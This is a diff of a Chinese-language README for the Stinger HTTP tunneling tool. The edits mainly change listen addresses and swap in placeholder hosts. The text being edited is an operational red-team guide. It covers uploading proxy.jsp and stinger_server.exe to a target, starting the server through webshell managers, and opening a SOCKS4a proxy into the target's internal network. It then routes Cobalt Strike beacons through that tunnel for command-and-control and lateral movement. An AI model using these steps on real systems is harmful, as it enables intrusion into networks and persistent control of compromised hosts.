@@ -18,7 +18,7 @@
 * proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe```启动服务端
 > 不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
-* vps执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 0.0.0.0 -p 60000```
+* vps执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
 * 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
@@ -46,7 +46,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
 2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
 ```
-* 此时已经在vps```127.0.0.1:60000```启动了一个```192.168.3.11```所在内网的**socks4a**代理
+* 此时已经在vps```127.0.0.1:60000```启动了一个```example.com```所在内网的**socks4a**代理
 * 此时已经将目标服务器的```127.0.0.1:60020```映射到vps的```127.0.0.1:60020```
 
 ## cobalt strike单主机上线
@@ -54,7 +54,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 * proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe```启动服务端
 > 不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
-* stinger_client命令行执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 0.0.0.0 -p 60000```
+* stinger_client命令行执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
 * 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
@@ -93,7 +93,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 * stinger_client命令行执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
 * 如下输出表示成功
 ```
-root@kali:~# ./stinger_client -w http://example.com:8080:8080/proxy.jsp -l 127.0.0.1 -p 60000
+root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
 2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
 2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
@@ -118,7 +118,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080:8080/proxy.jsp -l 127.0
 2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
 2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
 ```
-* cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为192.168.3.11
+* cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为192.168.3.11(example.com的内网IP地址)
 * 生成payload,上传到主机运行后即可上线
 * 横向移动到其他主机时可以将payload指向192.168.3.11:60020即可实现出网上线
 
